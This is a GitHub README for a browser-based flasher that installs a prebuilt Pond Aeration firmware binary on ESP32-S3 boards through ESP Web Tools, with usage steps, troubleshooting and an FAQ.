# Pond Aeration v2026 - Loader and Update Utility 2026

> **A browser-based firmware flasher for the Pond Aeration ESP32 project.** It opens a guided install page, serves the prebuilt factory binary, and prepares browser flashing for ESP32-S3 devices through ESP Web Tools.

[![Loader](https://img.shields.io/badge/Type-Loader-blue?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-ESP32-S3%20browser-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/coopernoah/pond-aeration-loader-update?style=flat-square)](https://github.com/coopernoah/pond-aeration-loader-update)

---

<p align="center">
  <a href="https://coopernoah.github.io/pond-aeration-loader-update/">
    <img src="https://img.shields.io/badge/Download-Pond%20Aeration%20Loader-brightgreen?style=for-the-badge" alt="Download Pond Aeration Loader">
  </a>
</p>

> **[Download Latest Build](https://coopernoah.github.io/pond-aeration-loader-update/)**

---

[Download Latest Build](https://coopernoah.github.io/pond-aeration-loader-update/)

---

## Overview

Pond Aeration is designed as a browser-first flashing experience for ESP32-S3 hardware. Rather than requiring a desktop installer or a full development setup, it provides a web-based path that can send firmware straight to the device in a compatible browser. The page is built around ESP Web Tools so the prebuilt factory binary can be delivered with very little user setup.

The repository also supports install pages in German and English, which helps make the flashing steps easier to follow for a wider audience. In practice, this project serves as the release and distribution point for the firmware binary, while the browser page handles the user journey from download to device programming.

## Loader Features

- Browser-based flashing flow for ESP32 and ESP32-S3 devices
- Uses an ESP Web Tools manifest for web delivery of the firmware binary
- Hosts a prebuilt factory binary for direct installation
- No PlatformIO installation required on the user side
- No command line workflow needed for the flashing step
- Separate DE and EN install pages for clearer guidance
- Fits a GitHub Pages deployment model for simple access
- Keeps the firmware entry point focused on guided setup rather than local tooling

## How To Use

1. Open the published install page in a supported browser:
   [Download Latest Build](https://coopernoah.github.io/pond-aeration-loader-update/)
2. Choose the page language that matches your preference.
3. Connect the ESP32-S3 device when prompted by the browser.
4. Follow the on-page instructions to start the flashing process.

If you are using the repository directly, it is organized as a static site, so the browser manages the install flow and the manifest resolves to the hosted firmware binary.

Example access pattern:

- Open: `https://coopernoah.github.io/pond-aeration-loader-update/
- Follow the install page prompts
- Select the device and begin flashing when the browser requests permission

## Update Channels

Because this project revolves around a hosted browser flashing page, updates are generally distributed through the published site together with its linked firmware binary.

| Channel | Purpose | Notes |
| --- | --- | --- |
| Latest | Main public install entry | Best place to start for current firmware |
| Manual | Direct repository or page access | Useful when checking files or deployment state |
| Language pages | German and English install views | Helps users follow the flashing steps in their preferred language |

## Troubleshooting

- If the page does not load, confirm that the GitHub Pages URL is correct and that the site has been published.
- If the browser does not offer device access, try a supported browser that can use Web Serial or the required web tool flow.
- If flashing does not start, reconnect the ESP32-S3 board and verify the USB cable and port.
- If the install page cannot find the firmware manifest, check that the hosted binary and manifest files were deployed together.
- If the device is not recognized, refresh the page and repeat the connection prompt.
- If a previous browser session seems stuck, clear the site data for the page and load it again.

## FAQ

### Do I need a local build environment?
No. The intended workflow is browser-based, so PlatformIO or a command line setup is not needed for the install step.

### Which file is provided?
The repository serves a prebuilt factory firmware binary that is ready for browser flashing.

### Are multiple languages supported?
Yes. The install flow includes both German and English pages.

### Can I roll back to an older release?
That depends on which versions are available in the repository or site history. If older builds remain published, you can return to a previous release by choosing the earlier hosted assets.

### Where do I see logs or diagnostics?
Feedback is normally shown through the browser flashing flow and the page itself. If the browser reports an error, reload the page and repeat the prompt.

### Is this limited to one board family?
The project is built around ESP32 and ESP32-S3 browser flashing, with the main target being ESP32-S3 devices in the guided install flow.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
